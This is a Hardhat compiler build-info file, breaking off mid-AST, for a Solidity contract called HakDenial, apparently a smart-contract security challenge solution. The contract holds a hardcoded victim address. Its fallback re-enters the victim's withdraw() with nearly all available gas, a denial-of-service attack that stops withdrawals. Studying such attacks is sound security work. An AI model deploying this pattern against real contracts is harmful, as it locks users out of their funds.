{
	"id": "9fa5b1c1a8ad10974620955dd7cc23dd",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.2",
	"solcLongVersion": "0.8.2+commit.661d1103",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/HakDenial.sol": {
				"content": "//SPDX-License-Identifier:MIT\r\npragma solidity^0.8.0;\r\n\r\ncontract HakDenial{\r\n    \r\n    address public owner;\r\n    address public daVic = 0x20ff93B3c7955B056B4fAAa42CD705CC487eE814;\r\n    constructor()  {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier isOwner(){\r\n        require(msg.sender==owner);\r\n        _;\r\n    }\r\n    function kill() isOwner() public {\r\n        selfdestruct(payable (owner));\r\n    }\r\n\r\n    function deny() public {\r\n        daVic.call{gas:7900000}(abi.encodeWithSignature('withdraw()'));\r\n    }\r\n    fallback() external payable{\r\n        deny();\r\n    }\r\n\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/HakDenial.sol": {
				"HakDenial": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"stateMutability": "payable",
							"type": "fallback"
						},
						{
							"inputs": [],
							"name": "daVic",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "deny",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "kill",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/HakDenial.sol\":57:584  contract HakDenial{\r... */\n  mstore(0x40, 0x80)\n    /* \"contracts/HakDenial.sol\":138:180  0x20ff93B3c7955B056B4fAAa42CD705CC487eE814 */\n  0x20ff93b3c7955b056b4faaa42cd705cc487ee814\n    /* \"contracts/HakDenial.sol\":115:180  address public daVic = 0x20ff93B3c7955B056B4fAAa42CD705CC487eE814 */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/HakDenial.sol\":187:239  constructor()  {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contracts/HakDenial.sol\":221:231  msg.sender */\n  caller\n    /* \"contracts/HakDenial.sol\":213:218  owner */\n  0x00\n  dup1\n    /* \"contracts/HakDenial.sol\":213:231  owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/HakDenial.sol\":57:584  contract HakDenial{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/HakDenial.sol\":57:584  contract HakDenial{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x41c0e1b5\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xa3fdfee3\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xf787e039\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"contracts/HakDenial.sol\":565:571  deny() */\n      tag_9\n        /* \"contracts/HakDenial.sol\":565:569  deny */\n      tag_10\n        /* \"contracts/HakDenial.sol\":565:571  deny() */\n      jump\t// in\n    tag_9:\n        /* \"contracts/HakDenial.sol\":57:584  contract HakDenial{\r... */\n      stop\n        /* \"contracts/HakDenial.sol\":328:409  function kill() isOwner() public {\r... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      stop\n        /* \"contracts/HakDenial.sol\":88:108  address public owner */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/HakDenial.sol\":417:521  function deny() public {\r... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_10\n      jump\t// in\n    tag_20:\n      stop\n        /* \"contracts/HakDenial.sol\":115:180  address public daVic = 0x20ff93B3c7955B056B4fAAa42CD705CC487eE814 */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_21\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_21:\n      pop\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      tag_24\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_24:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/HakDenial.sol\":417:521  function deny() public {\r... */\n    tag_10:\n        /* \"contracts/HakDenial.sol\":451:456  daVic */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/HakDenial.sol\":451:461  daVic.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/HakDenial.sol\":466:473  7900000 */\n      0x788b60\n        /* \"contracts/HakDenial.sol\":475:512  abi.encodeWithSignature('withdraw()') */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x3ccfd60b00000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/HakDenial.sol\":451:513  daVic.call{gas:7900000}(abi.encodeWithSignature('withdraw()')) */\n      mload(0x40)\n      tag_26\n      swap2\n      swap1\n      tag_27\n      jump\t// in\n    tag_26:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup8\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_30\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_29)\n    tag_30:\n      0x60\n      swap2\n      pop\n    tag_29:\n      pop\n      pop\n      pop\n        /* \"contracts/HakDenial.sol\":417:521  function deny() public {\r... */\n      jump\t// out\n        /* \"contracts/HakDenial.sol\":328:409  function kill() isOwner() public {\r... */\n    tag_13:\n        /* \"contracts/HakDenial.sol\":296:301  owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/HakDenial.sol\":284:301  msg.sender==owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/HakDenial.sol\":284:294  msg.sender */\n      caller\n        /* \"contracts/HakDenial.sol\":284:301  msg.sender==owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/HakDenial.sol\":276:302  require(msg.sender==owner) */\n      tag_32\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_32:\n        /* \"contracts/HakDenial.sol\":394:399  owner */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/HakDenial.sol\":372:401  selfdestruct(payable (owner)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n        /* \"contracts/HakDenial.sol\":88:108  address public owner */\n    tag_16:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/HakDenial.sol\":115:180  address public daVic = 0x20ff93B3c7955B056B4fAAa42CD705CC487eE814 */\n    tag_23:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:125   */\n    tag_35:\n        /* \"#utility.yul\":94:118   */\n      tag_37\n        /* \"#utility.yul\":112:117   */\n      dup2\n        /* \"#utility.yul\":94:118   */\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":89:92   */\n      dup3\n        /* \"#utility.yul\":82:119   */\n      mstore\n        /* \"#utility.yul\":72:125   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":131:504   */\n    tag_39:\n      0x00\n        /* \"#utility.yul\":263:301   */\n      tag_41\n        /* \"#utility.yul\":295:300   */\n      dup3\n        /* \"#utility.yul\":263:301   */\n      tag_42\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":317:405   */\n      tag_43\n        /* \"#utility.yul\":398:404   */\n      dup2\n        /* \"#utility.yul\":393:396   */\n      dup6\n        /* \"#utility.yul\":317:405   */\n      tag_44\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":310:405   */\n      swap4\n      pop\n        /* \"#utility.yul\":414:466   */\n      tag_45\n        /* \"#utility.yul\":459:465   */\n      dup2\n        /* \"#utility.yul\":454:457   */\n      dup6\n        /* \"#utility.yul\":447:451   */\n      0x20\n        /* \"#utility.yul\":440:445   */\n      dup7\n        /* \"#utility.yul\":436:452   */\n      add\n        /* \"#utility.yul\":414:466   */\n      tag_46\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":491:497   */\n      dup1\n        /* \"#utility.yul\":486:489   */\n      dup5\n        /* \"#utility.yul\":482:498   */\n      add\n        /* \"#utility.yul\":475:498   */\n      swap2\n      pop\n        /* \"#utility.yul\":239:504   */\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":510:781   */\n    tag_27:\n      0x00\n        /* \"#utility.yul\":662:755   */\n      tag_48\n        /* \"#utility.yul\":751:754   */\n      dup3\n        /* \"#utility.yul\":742:748   */\n      dup5\n        /* \"#utility.yul\":662:755   */\n      tag_39\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":655:755   */\n      swap2\n      pop\n        /* \"#utility.yul\":772:775   */\n      dup2\n        /* \"#utility.yul\":765:775   */\n      swap1\n      pop\n        /* \"#utility.yul\":644:781   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":787:1009   */\n    tag_18:\n      0x00\n        /* \"#utility.yul\":918:920   */\n      0x20\n        /* \"#utility.yul\":907:916   */\n      dup3\n        /* \"#utility.yul\":903:921   */\n      add\n        /* \"#utility.yul\":895:921   */\n      swap1\n      pop\n        /* \"#utility.yul\":931:1002   */\n      tag_50\n        /* \"#utility.yul\":999:1000   */\n      0x00\n        /* \"#utility.yul\":988:997   */\n      dup4\n        /* \"#utility.yul\":984:1001   */\n      add\n        /* \"#utility.yul\":975:981   */\n      dup5\n        /* \"#utility.yul\":931:1002   */\n      tag_35\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":885:1009   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1015:1113   */\n    tag_42:\n      0x00\n        /* \"#utility.yul\":1100:1105   */\n      dup2\n        /* \"#utility.yul\":1094:1106   */\n      mload\n        /* \"#utility.yul\":1084:1106   */\n      swap1\n      pop\n        /* \"#utility.yul\":1073:1113   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1119:1266   */\n    tag_44:\n      0x00\n        /* \"#utility.yul\":1257:1260   */\n      dup2\n        /* \"#utility.yul\":1242:1260   */\n      swap1\n      pop\n        /* \"#utility.yul\":1232:1266   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1272:1368   */\n    tag_38:\n      0x00\n        /* \"#utility.yul\":1338:1362   */\n      tag_54\n        /* \"#utility.yul\":1356:1361   */\n      dup3\n        /* \"#utility.yul\":1338:1362   */\n      tag_55\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":1327:1362   */\n      swap1\n      pop\n        /* \"#utility.yul\":1317:1368   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1374:1500   */\n    tag_55:\n      0x00\n        /* \"#utility.yul\":1451:1493   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1444:1449   */\n      dup3\n        /* \"#utility.yul\":1440:1494   */\n      and\n        /* \"#utility.yul\":1429:1494   */\n      swap1\n      pop\n        /* \"#utility.yul\":1419:1500   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1506:1813   */\n    tag_46:\n        /* \"#utility.yul\":1574:1575   */\n      0x00\n        /* \"#utility.yul\":1584:1697   */\n    tag_58:\n        /* \"#utility.yul\":1598:1604   */\n      dup4\n        /* \"#utility.yul\":1595:1596   */\n      dup2\n        /* \"#utility.yul\":1592:1605   */\n      lt\n        /* \"#utility.yul\":1584:1697   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1683:1684   */\n      dup1\n        /* \"#utility.yul\":1678:1681   */\n      dup3\n        /* \"#utility.yul\":1674:1685   */\n      add\n        /* \"#utility.yul\":1668:1686   */\n      mload\n        /* \"#utility.yul\":1664:1665   */\n      dup2\n        /* \"#utility.yul\":1659:1662   */\n      dup5\n        /* \"#utility.yul\":1655:1666   */\n      add\n        /* \"#utility.yul\":1648:1687   */\n      mstore\n        /* \"#utility.yul\":1620:1622   */\n      0x20\n        /* \"#utility.yul\":1617:1618   */\n      dup2\n        /* \"#utility.yul\":1613:1623   */\n      add\n        /* \"#utility.yul\":1608:1623   */\n      swap1\n      pop\n        /* \"#utility.yul\":1584:1697   */\n      jump(tag_58)\n    tag_60:\n        /* \"#utility.yul\":1715:1721   */\n      dup4\n        /* \"#utility.yul\":1712:1713   */\n      dup2\n        /* \"#utility.yul\":1709:1722   */\n      gt\n        /* \"#utility.yul\":1706:1708   */\n      iszero\n      tag_61\n      jumpi\n        /* \"#utility.yul\":1795:1796   */\n      0x00\n        /* \"#utility.yul\":1786:1792   */\n      dup5\n        /* \"#utility.yul\":1781:1784   */\n      dup5\n        /* \"#utility.yul\":1777:1793   */\n      add\n        /* \"#utility.yul\":1770:1797   */\n      mstore\n        /* \"#utility.yul\":1706:1708   */\n    tag_61:\n        /* \"#utility.yul\":1555:1813   */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212208f4ba91fe955d6f69bd8e42f870757785d4005dc063b4bd7ca20415b67bb532464736f6c63430008020033\n}\n",
						"bytecode": {
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527320ff93b3c7955b056b4faaa42cd705cc487ee814600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006557600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506103e5806100b56000396000f3fe6080604052600436106100435760003560e01c806341c0e1b51461004e5780638da5cb5b14610065578063a3fdfee314610090578063f787e039146100a757610044565b5b61004c6100d2565b005b34801561005a57600080fd5b506100636101e7565b005b34801561007157600080fd5b5061007a610278565b6040516100879190610319565b60405180910390f35b34801561009c57600080fd5b506100a56100d2565b005b3480156100b357600080fd5b506100bc61029c565b6040516100c99190610319565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662788b606040516024016040516020818303038152906040527f3ccfd60b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161019f9190610302565b60006040518083038160008787f1925050503d80600081146101dd576040519150601f19603f3d011682016040523d82523d6000602084013e6101e2565b606091505b505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461023f57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6102cb8161034a565b82525050565b60006102dc82610334565b6102e6818561033f565b93506102f681856020860161037c565b80840191505092915050565b600061030e82846102d1565b915081905092915050565b600060208201905061032e60008301846102c2565b92915050565b600081519050919050565b600081905092915050565b60006103558261035c565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b8381101561039a57808201518184015260208101905061037f565b838111156103a9576000848401525b5050505056fea26469706673582212208f4ba91fe955d6f69bd8e42f870757785d4005dc063b4bd7ca20415b67bb532464736f6c63430008020033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x20FF93B3C7955B056B4FAAA42CD705CC487EE814 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x65 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x3E5 DUP1 PUSH2 0xB5 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x41C0E1B5 EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x65 JUMPI DUP1 PUSH4 0xA3FDFEE3 EQ PUSH2 0x90 JUMPI DUP1 PUSH4 0xF787E039 EQ PUSH2 0xA7 JUMPI PUSH2 0x44 JUMP JUMPDEST JUMPDEST PUSH2 0x4C PUSH2 0xD2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x63 PUSH2 0x1E7 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x71 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x7A PUSH2 0x278 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x87 SWAP2 SWAP1 PUSH2 0x319 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA5 PUSH2 0xD2 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xBC PUSH2 0x29C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC9 SWAP2 SWAP1 PUSH2 0x319 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH3 0x788B60 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x3CCFD60B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x19F SWAP2 SWAP1 PUSH2 0x302 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP8 CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x1DD JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x1E2 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x23F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFDESTRUCT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH2 0x2CB DUP2 PUSH2 0x34A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2DC DUP3 PUSH2 0x334 JUMP JUMPDEST PUSH2 0x2E6 DUP2 DUP6 PUSH2 0x33F JUMP JUMPDEST SWAP4 POP PUSH2 0x2F6 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x37C JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x30E DUP3 DUP5 PUSH2 0x2D1 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x32E PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2C2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x355 DUP3 PUSH2 0x35C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x39A JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x37F JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x3A9 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 0x4B 0xA9 0x1F 0xE9 SSTORE 0xD6 0xF6 SWAP12 0xD8 0xE4 0x2F DUP8 SMOD JUMPI PUSH25 0x5D4005DC063B4BD7CA20415B67BB532464736F6C6343000802 STOP CALLER ",
							"sourceMap": "57:527:0:-:0;;;138:42;115:65;;;;;;;;;;;;;;;;;;;;187:52;;;;;;;;;;221:10;213:5;;:18;;;;;;;;;;;;;;;;;;57:527;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1816:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "72:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "89:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "112:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "94:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "94:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "82:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "82:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "82:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "60:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "67:3:1",
														"type": ""
													}
												],
												"src": "7:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "239:265:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "249:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "295:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "263:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "263:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "253:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "310:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "393:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "398:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "317:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "317:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "310:3:1"
																}
